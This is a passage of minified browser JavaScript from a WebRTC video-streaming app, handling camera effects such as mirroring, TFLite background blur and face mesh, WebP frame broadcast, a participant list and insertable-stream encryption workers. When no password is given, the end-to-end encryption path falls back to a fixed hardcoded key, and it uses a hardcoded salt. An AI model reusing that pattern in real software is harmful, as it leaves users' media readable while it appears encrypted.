if("8"==session.effect)setupCanvas(),session.canvasSource.srcObject.addTrack(track),session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720,session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2),simpleDraw();else if("2"==session.effect){setupCanvas(),session.canvasSource.srcObject.addTrack(track),session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720,session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2);var drawRate=parseInt(1e3/track.getSettings().frameRate)+1;null!==session.canvasInterval&&clearInterval(session.canvasInterval),session.canvasInterval=setInterval((function(){drawFrameMirrored(!0,!1)}),drawRate)}else if("-1"==session.effect){setupCanvas(),session.canvasSource.srcObject.addTrack(track),session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720,session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2);drawRate=parseInt(1e3/track.getSettings().frameRate)+1;null!==session.canvasInterval&&clearInterval(session.canvasInterval),session.canvasInterval=setInterval((function(){drawFrameMirrored(!1,!0)}),drawRate)}else if("-2"==session.effect){setupCanvas(),session.canvasSource.srcObject.addTrack(track),session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720,session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2);drawRate=parseInt(1e3/track.getSettings().frameRate)+1;null!==session.canvasInterval&&clearInterval(session.canvasInterval),session.canvasInterval=setInterval((function(){drawFrameMirrored(!0,!0)}),drawRate)}else if("3"==session.effect||"4"==session.effect||"5"==session.effect)setupCanvas(),session.canvasSource.srcObject.addTrack(track),session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720,session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2),TFLiteWorker();else{if("6"!=session.effect){if("13"==session.effect){try{track.applyConstraints({backgroundBlur:!0}).then((()=>{const settings=track.getSettings();log("Background blur is "+(settings.backgroundBlur?"ON":"OFF"))})).catch(errorlog)}catch(e){errorlog(e)}return track}session.canvasource?session.canvasSource.srcObject.getVideoTracks().forEach((function(trk){session.canvasSource.srcObject.removeTrack(trk)})):(session.canvasSource=createVideoElement(),session.canvasSource.srcObject=createMediaStream()),session.canvasSource.autoplay=!0,session.canvasSource.id="effectsVideoSource",session.canvasSource.srcObject.addTrack(track),session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720,session.canvas.width=512,session.canvas.height=288,(iOS||iPad)&&(session.canvasSource.style.position="absolute",session.canvasSource.style.left="0",session.canvasSource.style.top="0",session.canvasSource.style.maxWidth="1px",session.canvasSource.style.maxHeight="1px",session.canvasSource.controls=session.showControls||!1,session.canvasSource.setAttribute("playsinline",""),document.body.appendChild(session.canvasSource));try{JEELIZFACEFILTER.destroy()}catch(e){}return session.canvasWebGL&&(session.canvasWebGL.remove(),session.canvasWebGL=null),session.canvasWebGL=document.createElement("canvas"),session.canvasWebGL.width=track.getSettings().width||1280,session.canvasWebGL.height=track.getSettings().height||720,session.canvasWebGL.id="effectsCanvasTarget",session.canvasWebGL.style.position="fixed",session.canvasWebGL.style.top="-9999px",session.canvasWebGL.style.left="-9999px",document.body.appendChild(session.canvasWebGL),loadEffect(session.effect),session.canvasWebGL.captureStream().getVideoTracks()[0]}setupCanvas(),session.canvasSource.srcObject.addTrack(track),session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720,session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2),session.canvasSource.readyState>=3?mainMeshMask():session.canvasSource.onloadeddata=mainMeshMask}try{return session.canvas.captureStream().getVideoTracks()[0]}catch(e){return session.cleanOutput||warnUser(getTranslation("not-clean-session"),!1,!1),track}}function dataURItoArraybuffer(dataURI){for(var byteString=atob(dataURI.split(",")[1]),ab=(dataURI.split(",")[0].split(":")[1].split(";")[0],new ArrayBuffer(byteString.length)),ia=new Uint8Array(ab),i=0;i<byteString.length;i++)ia[i]=byteString.charCodeAt(i);return ab}var makeImagesActive=null;async function makeImages(startup=!1){if(session.webp&&!0!==makeImagesActive&&session.videoElement&&!session.videoMuted){var stream=session.getLocalStream();if(stream&&stream.getVideoTracks().length){if(null===makeImagesActive?(makeImagesActive=!0,session.webPcanvas=document.createElement("canvas"),session.webPcanvas.makeImagesTimeout=null,session.webPcanvas.aCtx=new AudioContext,session.webPcanvas.silence=session.webPcanvas.aCtx.createGain(),session.webPcanvas.silence.gain.value=0,session.webPcanvas.silence.connect(session.webPcanvas.aCtx.destination),session.webPcanvas.nowTime=(new Date).getTime(),session.webPcanvasCtx=session.webPcanvas.getContext("2d",{alpha:session.alpha})):(session.webPcanvas.makeImagesTimeout&&(session.webPcanvas.makeImagesTimeout.onended=null),makeImagesActive=!0),startup){exit=!0;for(var i in session.pcs)session.pcs[i].allowWebp&&(exit=!1);if(exit)return void(makeImagesActive=!1);log("MAKE IMAGES STARTING?")}var settings=stream.getVideoTracks()[0].getSettings();try{var broadcasting=!1,arrayBuffer=!1,width=480,height=270,timeout=settings.frameRate>24?1e3/24:1e3/settings.frameRate;0===session.webPquality?(width=1920,height=1080,timeout=settings.frameRate>30?1e3/30:1e3/settings.frameRate):1===session.webPquality?(width=1280,height=720,timeout=settings.frameRate>30?1e3/30:1e3/settings.frameRate):2===session.webPquality?(width=960,height=540,timeout=settings.frameRate>30?1e3/30:1e3/settings.frameRate):3===session.webPquality?(width=853,height=480,timeout=settings.frameRate>30?1e3/30:1e3/settings.frameRate):4===session.webPquality?(width=640,height=360,timeout=settings.frameRate>30?1e3/30:1e3/settings.frameRate):5===session.webPquality?(width=480,height=270,timeout=settings.frameRate>30?1e3/30:1e3/settings.frameRate):6===session.webPquality?(width=480,height=270,timeout=1e3/15):7===session.webPquality?(width=480,height=270,timeout=200):8===session.webPquality?(width=480,height=270,timeout=1e3/3):9===session.webPquality&&(width=640,height=360,timeout=1e3),session.webPcanvas.timeout=timeout,session.webPcanvas.quality=.66,settings.width<width?(session.webPcanvas.width=settings.width,session.webPcanvasCtx.width=settings.width):(session.webPcanvas.width=width,session.webPcanvasCtx.width=width),settings.height<height?(session.webPcanvas.height=settings.height,session.webPcanvasCtx.height=settings.height):(session.webPcanvas.height=height,session.webPcanvasCtx.height=height);var ar=session.webPcanvas.width/session.webPcanvas.height;for(var i in session.forceAspectRatio&&session.forceAspectRatio>ar?session.webPcanvas.width=session.webPcanvas.height*session.forceAspectRatio:session.forceAspectRatio&&session.forceAspectRatio<=ar&&(session.webPcanvas.height=session.webPcanvas.width*session.forceAspectRatio),session.pcs)try{if(session.pcs[i].allowWebp&&(broadcasting=!0,!session.pcs[i].sendChannel.bufferedAmount))try{arrayBuffer||(session.webPcanvasCtx.drawImage(session.videoElement,0,0,session.webPcanvas.width,session.webPcanvas.height),arrayBuffer=dataURItoArraybuffer(session.webPcanvas.toDataURL("image/"+session.webp,session.webPcanvas.quality))),session.pcs[i].sendChannel.send(arrayBuffer)}catch(e){errorlog(e)}}catch(e){}}catch(e){return errorlog(e),void(makeImagesActive=!1)}if(makeImagesActive=!1,session.webPcanvas.lastTime=session.webPcanvas.nowTime,session.webPcanvas.nowTime=(new Date).getTime(),broadcasting){var time=session.webPcanvas.timeout-(session.webPcanvas.nowTime-session.webPcanvas.lastTime);if(time<=0)(osc=session.webPcanvas.aCtx.createOscillator()).connect(session.webPcanvas.silence),session.webPcanvas.makeImagesTimeout=osc,osc.start(0),osc.onended=makeImages,osc.stop(session.webPcanvas.aCtx.currentTime);else(osc=session.webPcanvas.aCtx.createOscillator()).connect(session.webPcanvas.silence),session.webPcanvas.makeImagesTimeout=osc,osc.start(0),osc.onended=makeImages,osc.stop(session.webPcanvas.aCtx.currentTime+time/1e3)}else{for(var i in session.pcs){if(session.pcs[i].allowWebp)return(osc=session.webPcanvas.aCtx.createOscillator()).connect(session.webPcanvas.silence),session.webPcanvas.makeImagesTimeout=osc,osc.start(0),osc.onended=makeImages,void osc.stop(session.webPcanvas.aCtx.currentTime+time/1e3)}log("Stopping webP broadcast.")}}else if(errorlog("No video element; can't make images for webp mode"),makeImagesActive){var osc,exit=!0;for(var i in session.pcs)session.pcs[i].allowWebp&&(exit=!1);if(exit)return void(makeImagesActive=!1);session.webPcanvas.makeImagesTimeout&&(session.webPcanvas.makeImagesTimeout.onended=null,session.webPcanvas.makeImagesTimeout=null),(osc=session.webPcanvas.aCtx.createOscillator()).connect(session.webPcanvas.silence),session.webPcanvas.makeImagesTimeout=osc,osc.start(0),osc.onended=makeImages,osc.stop(session.webPcanvas.aCtx.currentTime+.5)}}}var updateUserListTimeout=null,updateUserListActive=!1;function updateUserList(){if(!0===session.showList);else if(!0!==session.showList&&(session.cleanOutput||!1!==session.scene||!session.roomid||session.director||!1===session.showList))return;clearInterval(updateUserListTimeout),updateUserListTimeout=setTimeout((function(){if(!updateUserListActive){updateUserListActive=!0;try{var added=!1;for(var UUID in getById("userList").innerHTML="",session.rpcs){if(session.rpcs[UUID].videoElement&&session.rpcs[UUID].streamSrc&&session.rpcs[UUID].streamSrc.getTracks().length||session.rpcs[UUID].canvas||session.rpcs[UUID].imageElement){if(session.rpcs[UUID].videoElement&&document.body.contains(session.rpcs[UUID].videoElement))continue;if(session.rpcs[UUID].canvas&&document.body.contains(session.rpcs[UUID].canvas))continue;if(session.rpcs[UUID].imageElement&&document.body.contains(session.rpcs[UUID].imageElement))continue}if(!session.rpcs[UUID].virtualHangup&&(session.rpcs[UUID].videoMuted||!session.rpcs[UUID].imageElement&&!session.rpcs[UUID].canvas||session.infocus&&session.infocus!==UUID||!session.rpcs[UUID].defaultSpeaker&&session.activeSpeaker)){if(session.directorList.indexOf(UUID)>=0&&!session.rpcs[UUID].streamSrc)continue;var insert=document.createElement("div");session.rpcs[UUID].label?insert.innerText=session.rpcs[UUID].label.split("\\n")[0]+"":session.directorList.indexOf(UUID)>=0?miniTranslate(insert,"director"):miniTranslate(insert,"unknown-user");try{if(insert.dataset.UUID=UUID,insert.dataset.sid=session.rpcs[UUID].streamID,insert.title="Stream ID: "+session.rpcs[UUID].streamID,insert.addEventListener("click",(function(e){log("clicked");try{if(!1!==session.statsMenu){var uid=e.currentTarget.dataset.UUID;if(e.ctrlKey||e.metaKey){if(e.preventDefault(),"stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}return e.stopPropagation(),!1}}}catch(e){errorlog(e)}})),session.statsMenu&&"stats"in session.rpcs[UUID]){getById("menuStatsBox")&&(clearInterval(getById("menuStatsBox").interval),getById("menuStatsBox").remove());var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,UUID),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,UUID)}}catch(e){}if(getById("userList").appendChild(insert),session.rpcs[UUID].videoElement){var volumeBarInsert=document.createElement("input");volumeBarInsert.type="range",volumeBarInsert.className="hidden",volumeBarInsert.setAttribute("orient","vertical"),volumeBarInsert.max=100,volumeBarInsert.min=0,volumeBarInsert.step=1,volumeBarInsert.dataset.UUID=UUID,volumeBarInsert.setAttribute("value",100*parseFloat(session.rpcs[UUID].videoElement.volume)),volumeBarInsert.title=volumeBarInsert.value+"%",volumeBarInsert.oninput=function(e){session.rpcs[this.dataset.UUID].videoElement.volume=parseInt(this.value)/100||0,session.rpcs[this.dataset.UUID].videoElement.volume?this.parentNode.classList.remove("red"):this.parentNode.classList.add("red")},volumeBarInsert.onchange=function(e){this.parentNode.querySelector("input").classList.toggle("hidden")};var volumeButton=document.createElement("i");volumeButton.className="las la-volume-up",volumeButton.onclick=function(){this.parentNode.querySelector("input").classList.toggle("hidden"),this.parentNode.volumeBarInsert.focus()};var volumeInsert=document.createElement("div");volumeInsert.className="volume-control-userlist",volumeInsert.volumeBarInsert=volumeBarInsert,insert.appendChild(volumeInsert),volumeInsert.appendChild(volumeBarInsert),volumeInsert.appendChild(volumeButton)}if(session.rpcs[UUID].remoteMuteState||!session.rpcs[UUID].streamSrc){var muteInsert=document.createElement("div");muteInsert.className="video-mute-state-userlist",muteInsert.innerHTML='<i class="las la-microphone-slash"></i>',insert.appendChild(muteInsert)}else session.rpcs[UUID].voiceMeter&&insert.appendChild(session.rpcs[UUID].voiceMeter);added=!0}}getById("connectUsers").style.display=added?"block":"none"}catch(e){}updateUserListActive=!1}}),200)}function resetCanvas(){log("resetCanvas();"),session.streamSrc?session.streamSrc.getVideoTracks().forEach((track=>{session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720})):checkBasicStreamsExist()}var LaunchTFWorkerCallback=!1;function TFLiteWorker(){if(0==session.tfliteModule)return void(LaunchTFWorkerCallback=!0);if(TFLITELOADING)return void(LaunchTFWorkerCallback=!0);if(LaunchTFWorkerCallback=!1,log("TFLiteWorker() called"),session.tfliteModule.img||(session.selectImageTFLITE_contents||(session.selectImageTFLITE_contents=getById("selectImageTFLITE_contents")),session.selectImageTFLITE_contents.querySelector("img")?(session.tfliteModule.img=session.selectImageTFLITE_contents.querySelector("img"),session.tfliteModule.img.classList.add("selectedTFImage")):session.defaultBackgroundImages&&session.defaultBackgroundImages.length?(session.tfliteModule.img=document.createElement("img"),session.tfliteModule.img.onload=function(){URL.revokeObjectURL(session.tfliteModule.img.src)},session.tfliteModule.img.src=session.defaultBackgroundImages[0],session.tfliteModule.img.classList.add("selectedTFImage")):(session.tfliteModule.img=document.createElement("img"),session.tfliteModule.img.onload=function(){URL.revokeObjectURL(session.tfliteModule.img.src)},session.tfliteModule.img.src="./media/bg_sample.webp")),session.tfliteModule.looping)return;const inputMemoryOffset=session.tfliteModule._getInputMemoryOffset()/4,outputMemoryOffset=session.tfliteModule._getOutputMemoryOffset()/4,segmentationMask=new ImageData(256,144),segmentationMaskCanvas=document.createElement("canvas");segmentationMaskCanvas.width=256,segmentationMaskCanvas.height=144;const segmentationMaskCtx=segmentationMaskCanvas.getContext("2d",{alpha:!0,willReadFrequently:!0});session.tfliteModule.nowTime=(new Date).getTime(),session.tfliteModule.offsetTime=0;var aCtx=new AudioContext,silence=aCtx.createGain();silence.gain.value=0,silence.connect(aCtx.destination);var slow=0,slower=!1;async function processiOS(timerunning=!1){if("3"==session.effect||"4"==session.effect||"5"==session.effect){if(!session.tfliteModule.activelyProcessing){if(session.tfliteModule.activelyProcessing=!0,screenWidth!==window.innerWidth)return screenWidth=window.innerWidth,setTimeout((function(){updateRenderOutpipe()}),200),session.tfliteModule.looping=!1,void(session.tfliteModule.activelyProcessing=!1);try{segmentationMaskCtx.drawImage(session.canvasSource,0,0,session.canvasSource.width,session.canvasSource.height,0,0,256,144);var imageData=segmentationMaskCtx.getImageData(0,0,256,144);for(let i=0;i<36864;i++)session.tfliteModule.HEAPF32[inputMemoryOffset+3*i]=imageData.data[4*i]/255,session.tfliteModule.HEAPF32[inputMemoryOffset+3*i+1]=imageData.data[4*i+1]/255,session.tfliteModule.HEAPF32[inputMemoryOffset+3*i+2]=imageData.data[4*i+2]/255;session.tfliteModule._runInference();for(let i=0;i<36864;i++){const background=session.tfliteModule.HEAPF32[outputMemoryOffset+2*i],person=session.tfliteModule.HEAPF32[outputMemoryOffset+2*i+1],shift=Math.max(background,person),backgroundExp=Math.exp(background-shift),personExp=Math.exp(person-shift);segmentationMask.data[4*i+3]=255-255*personExp/(backgroundExp+personExp)}if(segmentationMaskCtx.putImageData(segmentationMask,0,0),session.canvasCtx.globalCompositeOperation="copy",session.canvasCtx.drawImage(session.canvasSource,0,0),session.canvasCtx.globalCompositeOperation="destination-out",session.canvasCtx.drawImage(segmentationMaskCanvas,0,0,256,144,0,0,session.canvasSource.width,session.canvasSource.height),session.canvasCtx.globalCompositeOperation="destination-over","4"==session.effect)session.canvasCtx.fillStyle="#0F0",session.canvasCtx.fillRect(0,0,session.canvas.width,session.canvas.height);else if("5"==session.effect){if(session.tfliteModule.img.complete)try{session.canvasCtx.drawImage(session.tfliteModule.img,0,0,session.canvas.width,session.canvas.height)}catch(e){}}else{if("3"!=session.effect)return session.tfliteModule.activelyProcessing=!1,void(session.tfliteModule.looping=!1);{const width=canvasBG.width,height=canvasBG.height;ctxBG.drawImage(session.canvasSource,0,0,width,height),imageData=ctxBG.getImageData(0,0,width,height);const{data:data}=imageData,wm=width-1,hm=height-1,rad1=amount+1,r=[],g=[],b=[],vmin=[],vmax=[];let p,p1,p2,iterations=3;for(;iterations-- >0;){let yw=0,yi=0;for(let y=0;y<height;y++){let rsum=data[yw]*rad1,gsum=data[yw+1]*rad1,bsum=data[yw+2]*rad1;for(let i=1;i<=amount;i++)p=yw+((i>wm?wm:i)<<2),rsum+=data[p++],gsum+=data[p++],bsum+=data[p++];for(let x=0;x<width;x++)r[yi]=rsum,g[yi]=gsum,b[yi]=bsum,0===y&&(vmin[x]=((p=x+rad1)<wm?p:wm)<<2,vmax[x]=(p=x-amount)>0?p<<2:0),p1=yw+vmin[x],p2=yw+vmax[x],rsum+=data[p1++]-data[p2++],gsum+=data[p1++]-data[p2++],bsum+=data[p1++]-data[p2++],yi++;yw+=width<<2}for(let x=0;x<width;x++){let yp=x,rsum=r[yp]*rad1,gsum=g[yp]*rad1,bsum=b[yp]*rad1;for(let i=1;i<=amount;i++)yp+=i>hm?0:width,rsum+=r[yp],gsum+=g[yp],bsum+=b[yp];yi=x<<2;for(let y=0;y<height;y++)data[yi]=rsum*mulSum>>>shgSum,data[yi+1]=gsum*mulSum>>>shgSum,data[yi+2]=bsum*mulSum>>>shgSum,0===x&&(vmin[y]=((p=y+rad1)<hm?p:hm)*width,vmax[y]=(p=y-amount)>0?p*width:0),p1=x+vmin[y],p2=x+vmax[y],rsum+=r[p1]-r[p2],gsum+=g[p1]-g[p2],bsum+=b[p1]-b[p2],yi+=width<<2}}ctxBG.putImageData(imageData,0,0),session.canvasCtx.drawImage(canvasBG,0,0,width,height,0,0,session.canvas.width,session.canvas.height)}}}catch(e){return session.tfliteModule.activelyProcessing=!1,session.tfliteModule.looping=!1,void errorlog(e)}session.tfliteModule.lastTime=session.tfliteModule.nowTime,session.tfliteModule.nowTime=(new Date).getTime();var osc,time=30-(session.tfliteModule.nowTime-session.tfliteModule.lastTime||0);if(time+=session.tfliteModule.offsetTime||0,session.tfliteModule.activelyProcessing=!1,slow-=1,time<=0)time<-40&&(slow+=1)>100&&(slower=!0),session.tfliteModule.offsetTime=0,(osc=aCtx.createOscillator()).connect(silence),osc.start(0),osc.onended=processiOS,osc.stop(aCtx.currentTime);else slow-=2,session.tfliteModule.offsetTime=time||0,(osc=aCtx.createOscillator()).connect(silence),osc.start(0),osc.onended=processiOS,osc.stop(aCtx.currentTime+time/1e3)}}else session.tfliteModule.looping=!1}session.tfliteModule.looping=!0;var screenWidth=window.innerWidth;if(iOS||iPad||SafariVersion){var canvasBG=document.createElement("canvas"),ctxBG=canvasBG.getContext("2d",{alpha:!1}),amount=1,mulSum=[1,57,41,21,203,34,97,73,227,91,149,62,105,45,39,137,241,107,3,173,39,71,65,238,219,101,187,87,81,151,141,133,249,117,221,209,197,187,177,169,5,153,73,139,133,127,243,233,223,107,103,99,191,23,177,171,165,159,77,149,9,139,135,131,253,245,119,231,224,109,211,103,25,195,189,23,45,175,171,83,81,79,155,151,147,9,141,137,67,131,129,251,123,30,235,115,113,221,217,53,13,51,50,49,193,189,185,91,179,175,43,169,83,163,5,79,155,19,75,147,145,143,35,69,17,67,33,65,255,251,247,243,239,59,29,229,113,111,219,27,213,105,207,51,201,199,49,193,191,47,93,183,181,179,11,87,43,85,167,165,163,161,159,157,155,77,19,75,37,73,145,143,141,35,138,137,135,67,33,131,129,255,63,250,247,61,121,239,237,117,29,229,227,225,111,55,109,216,213,211,209,207,205,203,201,199,197,195,193,48,190,47,93,185,183,181,179,178,176,175,173,171,85,21,167,165,41,163,161,5,79,157,78,154,153,19,75,149,74,147,73,144,143,71,141,140,139,137,17,135,134,133,66,131,65,129,1][amount],shgSum=[0,9,10,10,14,12,14,14,16,15,16,15,16,15,15,17,18,17,12,18,16,17,17,19,19,18,19,18,18,19,19,19,20,19,20,20,20,20,20,20,15,20,19,20,20,20,21,21,21,20,20,20,21,18,21,21,21,21,20,21,17,21,21,21,22,22,21,22,22,21,22,21,19,22,22,19,20,22,22,21,21,21,22,22,22,18,22,22,21,22,22,23,22,20,23,22,22,23,23,21,19,21,21,21,23,23,23,22,23,23,21,23,22,23,18,22,23,20,22,23,23,23,21,22,20,22,21,22,24,24,24,24,24,22,21,24,23,23,24,21,24,23,24,22,24,24,22,24,24,22,23,24,24,24,20,23,22,23,24,24,24,24,24,24,24,23,21,23,22,23,24,24,24,22,24,24,24,23,22,24,24,25,23,25,25,23,24,25,25,24,22,25,25,25,24,23,24,25,25,25,25,25,25,25,25,25,25,25,25,23,25,23,24,25,25,25,25,25,25,25,25,25,24,22,25,25,23,25,25,20,24,25,24,25,25,22,24,25,24,25,24,25,25,24,25,25,25,25,22,25,25,25,24,25,24,25,18][amount];log("session.canvas: "+session.canvas.width+"x"+session.canvas.height),canvasBG.width=parseInt(session.canvas.width/12),canvasBG.height=parseInt(session.canvas.height/12),ctxBG.width=canvasBG.width,ctxBG.height=canvasBG.height,osc.onended=processiOS,processiOS(!0)}else!async function process(timerunning=!1){if("3"==session.effect||"4"==session.effect||"5"==session.effect){if(!session.tfliteModule.activelyProcessing){if(session.tfliteModule.activelyProcessing=!0,session.mobile&&screenWidth!==window.innerWidth)return screenWidth=window.innerWidth,session.tfliteModule.looping=!1,session.tfliteModule.activelyProcessing=!1,void setTimeout((function(){updateRenderOutpipe()}),200);try{segmentationMaskCtx.filter="none",segmentationMaskCtx.drawImage(session.canvasSource,0,0,session.canvasSource.width,session.canvasSource.height,0,0,256,144);const imageData=segmentationMaskCtx.getImageData(0,0,256,144);for(let i=0;i<36864;i++)session.tfliteModule.HEAPF32[inputMemoryOffset+3*i]=imageData.data[4*i]/255,session.tfliteModule.HEAPF32[inputMemoryOffset+3*i+1]=imageData.data[4*i+1]/255,session.tfliteModule.HEAPF32[inputMemoryOffset+3*i+2]=imageData.data[4*i+2]/255;session.tfliteModule._runInference();for(let i=0;i<36864;i++){const background=session.tfliteModule.HEAPF32[outputMemoryOffset+2*i],person=session.tfliteModule.HEAPF32[outputMemoryOffset+2*i+1],shift=Math.max(background,person),backgroundExp=Math.exp(background-shift),personExp=Math.exp(person-shift);segmentationMask.data[4*i+3]=Math.min(Math.pow(255*personExp/(backgroundExp+personExp),1.5)-10,255)}if(segmentationMaskCtx.putImageData(segmentationMask,0,0),session.canvasCtx.globalCompositeOperation="copy",session.mobile&&!session.flagship||slower?session.canvasCtx.filter="blur(4px)":session.canvasCtx.filter="blur(8px)",session.canvasCtx.drawImage(segmentationMaskCanvas,0,0,256,144,0,0,session.canvasSource.width,session.canvasSource.height),session.canvasCtx.globalCompositeOperation="source-in",session.canvasCtx.filter="none",session.canvasCtx.drawImage(session.canvasSource,0,0),session.canvasCtx.globalCompositeOperation="destination-over","4"==session.effect)session.canvasCtx.filter="none",session.canvasCtx.fillStyle="#0F0",session.canvasCtx.fillRect(0,0,session.canvas.width,session.canvas.height);else if("5"==session.effect){if(session.canvasCtx.filter="none",session.tfliteModule.img.complete)try{session.canvasCtx.drawImage(session.tfliteModule.img,0,0,session.canvas.width,session.canvas.height)}catch(e){}}else{if("3"!=session.effect)return session.tfliteModule.activelyProcessing=!1,void(session.tfliteModule.looping=!1);session.effectValue?session.canvasCtx.filter="blur("+2*parseInt(session.effectValue)+"px)":session.canvasCtx.filter="blur(4px)",session.canvasCtx.drawImage(session.canvasSource,0,0),session.canvasCtx.filter="none"}}catch(e){return errorlog(e),session.tfliteModule.activelyProcessing=!1,void(session.tfliteModule.looping=!1)}session.tfliteModule.lastTime=session.tfliteModule.nowTime,session.tfliteModule.nowTime=(new Date).getTime();var osc,time=30-(session.tfliteModule.nowTime-session.tfliteModule.lastTime||0);time+=session.tfliteModule.offsetTime||0,session.tfliteModule.activelyProcessing=!1,slow-=1,time<=0?(time<-40&&(slow+=1)>100&&(slower=!0),session.tfliteModule.offsetTime=0,(osc=aCtx.createOscillator()).connect(silence),osc.start(0),osc.onended=process,osc.stop(aCtx.currentTime)):(slow-=2,session.tfliteModule.offsetTime=time||0,(osc=aCtx.createOscillator()).connect(silence),osc.start(0),osc.onended=process,osc.stop(aCtx.currentTime+time/1e3))}}else session.tfliteModule.looping=!1}(!0)}var insertableStreamWorker=null;function setupSenderTransform(sender,UUID=!1){insertableStreamWorker||((insertableStreamWorker=new Worker("./insertableStreamWorker.js",{name:"Insertable Stream worker"})).onmessage=event=>{"insertableStreamWorkerLoaded"===event.data?"e2ee"==session.encodedInsertableStreams?session.password?insertableStreamWorker.postMessage({cryptoPhrase:session.password+session.salt+"aDdedSaLt123"}):insertableStreamWorker.postMessage({cryptoKey:"aabbccddeeff00112233445566778899"}):"lyra"==session.encodedInsertableStreams&&insertableStreamWorker.postMessage({lyraCodecModule:session.lyraCodecModule}):console.log(event.data)});try{const senderStreams=sender.createEncodedStreams(),{readable:readable,writable:writable}=senderStreams;let operation="pass";"e2ee"==session.encodedInsertableStreams?operation="encode":"red"==session.encodedInsertableStreams?operation="redencode":("lyra"==session.encodedInsertableStreams&&sender.track&&"audio"===sender.track.kind||UUID&&session.pcs[UUID]&&"lyra"==session.pcs[UUID].preferAudioCodec&&sender.track&&"audio"===sender.track.kind)&&(operation="lyraencode"),insertableStreamWorker.postMessage({operation:operation,readable:readable,writable:writable},[readable,writable])}catch(e){errorlog(e)}}function setupReceiverTransform(receiver,UUID=!1){insertableStreamWorker||((insertableStreamWorker=new Worker("./insertableStreamWorker.js",{name:"Insertable Stream worker"})).onmessage=event=>{"insertableStreamWorkerLoaded"===event.data?"e2ee"==session.encodedInsertableStreams?session.password?insertableStreamWorker.postMessage({cryptoPhrase:session.password+session.salt+"aDdedSaLt123"}):insertableStreamWorker.postMessage({cryptoKey:"aabbccddeeff00112233445566778899"}):"lyra"==session.encodedInsertableStreams&&insertableStreamWorker.postMessage({lyraCodecModule:session.lyraCodecModule}):console.log(event.data)});try{let operation="pass";"e2ee"==session.encodedInsertableStreams?operation="decode":"red"==session.encodedInsertableStreams?operation="reddecode":"lyra"==session.encodedInsertableStreams&&receiver.track&&"audio"===receiver.track.kind&&(operation="lyradecode");const receiverStreams=receiver.createEncodedStreams(),{readable:readable,writable:writable}=receiverStreams;insertableStreamWorker.postMessage({operation:operation,readable:readable,writable:writable},[readable,writable])}catch(e){errorlog(e)}}function mainMeshMask(){null!==session.TFJSModel&&!0!==session.TFJSModel?async function process(){if(session.TFJSModel.activelyProcessing)return;if(session.TFJSModel.activelyProcessing=!0,"6"!==session.effect)return session.TFJSModel.timeoutDraw&&(session.TFJSModel.timeoutDraw(),session.TFJSModel.timeoutDraw=null),void(session.TFJSModel.activelyProcessing=!1);const predictions=await session.TFJSModel.estimateFaces({input:session.canvasSource});var h,output=[];if(predictions.length>0)for(let j=0;j<predictions.length;j++){predictions[j].annotations;session.canvasCtx.fillStyle="#000000",session.canvasCtx.fillRect(0,0,session.canvas.width,session.canvas.height);const keypoints=predictions[j].scaledMesh;for(let i=0;i<keypoints.length;i++){var[x,y,z]=keypoints[i];x=parseInt(x),y=parseInt(y),z=parseInt(z),session.pushEffectsData&&(output.push(x),output.push(y)),session.canvasCtx.fillStyle=(h=void 0,(h=parseInt(240*(1-(z+40)/60)))<0&&(h=0),h>240&&(h=240),"hsl("+h+", 100%, 50%)"),session.canvasCtx.fillRect(x,y,5,5)}}if(session.pushEffectsData)if(isIFrame)parent.postMessage({effectsData:output,eID:session.pushEffectsData},session.iframetarget);else for(var i in session.pcs)session.pcs[i].sendChannel.bufferedAmount||session.sendMessage({effectsData:output,eID:session.effect},i);if(!session.TFJSModel.timeoutDraw)try{session.TFJSModel.timeoutDraw=audioTimerLoop(process,session.canvasSource.srcObject.getVideoTracks()[0].getSettings().frameRate||30)}catch(e){session.TFJSModel.timeoutDraw=audioTimerLoop(process,30)}session.TFJSModel.activelyProcessing=!1}():setTimeout((function(){mainMeshMask()}),1e3)}var faceDetector=!1,faceAlignment=!1,activeDetection=!1;function drawFace(){if("1"===session.effect)if(faceAlignment)faceAlignment();else if(null!==faceAlignment){faceAlignment=null;var timers={activelyProcessingDraw:!1},ctx=session.canvasCtx;faceAlignment=function fde1(){warnlog("LOADED drawFace()");var lastFace={};function detectFace(){if(!activeDetection&&(activeDetection=!0,"1"===session.effect)){try{faceDetector.detect(session.canvasSource).then((faces=>{if(faces.length)for(let face of faces){lastFace.x=face.boundingBox.x,lastFace.y=face.boundingBox.y,lastFace.w=face.boundingBox.width,lastFace.h=face.boundingBox.height;break}})).catch((e=>{errorlog("Boo, Face Detection failed: "+e)}))}catch(e){}setTimeout((function(){detectFace()}),200),activeDetection=!1}}lastFace.x=session.canvasSource.width/2,lastFace.y=session.canvasSource.height/2,lastFace.w=session.canvasSource.width,lastFace.h=session.canvasSource.height,session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2);var wh=null,xa=null,ya=null;function draw(){if(!timers.activelyProcessingDraw){if(timers.activelyProcessingDraw=!0,"1"!==session.effect)return timers.activelyProcessingDraw=!1,void(timers.timeoutDraw&&(timers.timeoutDraw(),timers.timeoutDraw=null));try{if(!session.canvasSource.width)return 